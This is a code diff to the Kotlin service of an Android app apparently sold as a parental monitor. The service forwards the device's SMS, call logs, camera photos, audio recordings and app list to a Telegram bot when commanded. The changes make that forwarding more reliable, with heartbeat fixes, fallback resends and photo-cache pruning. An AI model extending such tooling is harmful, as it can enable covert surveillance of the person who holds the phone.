@@ -77,6 +77,7 @@ class MonitoringService : Service() {
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{3,15}$")
+        private val TAG_STRIP_REGEX = Regex("<[^>]*>")
         const val ACTION_STOP_MONITORING = "STOP_MONITORING"
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
@@ -89,10 +90,14 @@ class MonitoringService : Service() {
             try {
                 val file = File(context.cacheDir, "monitor_heartbeat")
                 try {
-                    if (!file.exists()) file.createNewFile()
+                    file.writeText(android.os.SystemClock.elapsedRealtime().toString())
                 } catch (_: Exception) {
+                    try {
+                        if (!file.exists()) file.createNewFile()
+                    } catch (_: Exception) {
+                    }
+                    file.setLastModified(System.currentTimeMillis())
                 }
-                file.setLastModified(System.currentTimeMillis())
             } catch (_: Exception) {
             }
         }
@@ -100,7 +105,14 @@ class MonitoringService : Service() {
         fun heartbeatFresh(context: android.content.Context, maxAgeMs: Long = 10 * 60_000L): Boolean {
             return try {
                 val file = File(context.cacheDir, "monitor_heartbeat")
-                file.exists() && System.currentTimeMillis() - file.lastModified() < maxAgeMs
+                if (!file.exists()) return false
+                val stored = try {
+                    file.readText().trim().toLong()
+                } catch (_: Exception) {
+                    return false
+                }
+                val now = android.os.SystemClock.elapsedRealtime()
+                now >= stored && now - stored < maxAgeMs
             } catch (_: Exception) {
                 false
             }
@@ -886,6 +898,10 @@ class MonitoringService : Service() {
                     sendToTelegram("Usage: /syncinterval \u003c1-1440\u003e (minutes)")
                 } else {
                     preferencesManager.syncInterval = minutes
+                    try {
+                        restartAllLoops()
+                    } catch (_: Exception) {
+                    }
                     sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
                 }
             }
@@ -1328,11 +1344,11 @@ class MonitoringService : Service() {
                         }
                     }
                     sendFitted(message)
+                    try {
+                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
+                    } catch (_: Exception) {
+                    }
                     delay(500)
-                }
-                try {
-                    preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, allSms.maxOf { it.id })
-                } catch (_: Exception) {
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
             }
@@ -1356,17 +1372,17 @@ class MonitoringService : Service() {
                         }
                     }
                     sendFitted(message)
-                    delay(500)
-                }
-                try {
-                    val latest = allCalls.maxWith(compareBy({ it.date }, { it.id }))
-                    if (latest.date > preferencesManager.lastCallTimestamp ||
-                        (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                    ) {
-                        preferencesManager.lastCallTimestamp = latest.date
-                        preferencesManager.lastCallId = latest.id
+                    try {
+                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                        if (latest.date > preferencesManager.lastCallTimestamp ||
+                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                        ) {
+                            preferencesManager.lastCallTimestamp = latest.date
+                            preferencesManager.lastCallId = latest.id
+                        }
+                    } catch (_: Exception) {
                     }
-                } catch (_: Exception) {
+                    delay(500)
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All calls sent")
             }
@@ -1620,7 +1636,43 @@ class MonitoringService : Service() {
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
             } else if (response.code() == 400) {
-                android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
+                val plain = message.replace(TAG_STRIP_REGEX, "")
+                if (plain != message) {
+                    try {
+                        val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
+                        val fallbackResp = TelegramClient.api.sendMessage(fallbackUrl, TelegramMessage(chatId = chatId, text = plain, parseMode = null))
+                        if (fallbackResp.isSuccessful && fallbackResp.body()?.ok == true) {
+                            preferencesManager.lastSyncTime = System.currentTimeMillis()
+                            try {
+                                preferencesManager.credentialError = ""
+                                preferencesManager.credentialErrorAt = 0L
+                            } catch (_: Exception) {
+                            }
+                        } else if (fallbackResp.code() == 429) {
+                            val retryAfter = NetworkUtils.parseRetryAfter(try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null })
+                            messageQueue.addMessage(plain)
+                            MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
+                        } else if (fallbackResp.code() == 401 || fallbackResp.code() == 403) {
+                            try {
+                                preferencesManager.credentialError = fallbackResp.code().toString()
+                                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                            } catch (_: Exception) {
+                            }
+                            messageQueue.addMessage(plain)
+                            MessageScheduler.scheduleMessageSend(this)
+                        } else if (fallbackResp.code() == 408 || fallbackResp.code() >= 500) {
+                            messageQueue.addMessage(plain)
+                            MessageScheduler.scheduleMessageSend(this)
+                        } else {
+                            android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
+                        }
+                    } catch (_: Exception) {
+                        messageQueue.addMessage(plain)
+                        MessageScheduler.scheduleMessageSend(this)
+                    }
+                } else {
+                    android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
+                }
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                 messageQueue.addMessage(message)
@@ -1709,14 +1761,20 @@ class MonitoringService : Service() {
             return
         }
         if (pendingPhotoCount() >= 10) {
-            serviceScope.launch {
-                if (reportResult) {
-                    sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
-                } else {
-                    notifyCameraFailure("photo backlog full")
-                }
+            try {
+                prunePhotoCache(9)
+            } catch (_: Exception) {
             }
-            return
+            if (pendingPhotoCount() >= 10) {
+                serviceScope.launch {
+                    if (reportResult) {
+                        sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
+                    } else {
+                        notifyCameraFailure("photo backlog full")
+                    }
+                }
+                return
+            }
         }
         if (!hasCameraPermission()) {
             serviceScope.launch {
@@ -2018,6 +2076,10 @@ class MonitoringService : Service() {
                 flushPendingAudio()
             } else {
                 keepForRetry = true
+                try {
+                    flushPendingAudio()
+                } catch (_: Exception) {
+                }
                 sendToTelegram("\u26A0\uFE0F Audio recorded but send failed. File kept for automatic retry.")
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
@@ -2154,11 +2216,17 @@ class MonitoringService : Service() {
             }
             infos.mapNotNull { r ->
                 try {
-                    r.loadLabel(packageManager)?.toString()
+                    val label = r.loadLabel(packageManager)?.toString() ?: return@mapNotNull null
+                    val pkg = try {
+                        r.activityInfo?.packageName
+                    } catch (_: Exception) {
+                        null
+                    } ?: return@mapNotNull null
+                    label to pkg
                 } catch (_: Exception) {
                     null
                 }
-            }.distinct().sortedBy { it.lowercase() }.take(limit)
+            }.distinctBy { it.second }.sortedBy { it.first.lowercase(java.util.Locale.ROOT) }.take(limit).map { it.first }
         } catch (_: Exception) {
             emptyList()
         }
